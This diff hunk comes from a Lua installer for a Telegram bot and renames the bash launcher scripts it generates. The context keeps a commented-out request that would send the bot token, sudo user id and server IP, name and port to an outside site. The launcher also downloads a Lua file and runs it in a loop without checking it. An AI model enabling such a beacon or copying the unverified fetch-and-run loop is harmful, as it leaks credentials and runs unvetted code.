@@ -68,27 +68,27 @@ local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 --- local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("::Black::")
-local RunBot = io.open("BLACKBOTSS", 'w')
+local RunBot = io.open("BlAckY_TeAM", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/BlAckY_TeAM
 token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr BLACKBOTSS.lua
+rm -fr BlAckY_TeAM.lua
 wget "https://raw.githubusercontent.com/BlAckY-TeAM/BlAckY_TeAM/master/BlAckY_TeAM.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./BLACKBOTSS.lua -p PROFILE --bot=$token
+./tg -s ./BlAckY_TeAM.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/BlAckY_TeAM
 while(true) do
 rm -fr ../.telegram-cli
-screen -S BLACKBOTSS -X kill
-screen -S BLACKBOTSS ./BLACKBOTSS
+screen -S BlAckY_TeAM -X kill
+screen -S BlAckY_TeAM ./BlAckY_TeAM
 done
 ]])
 RunTs:close()
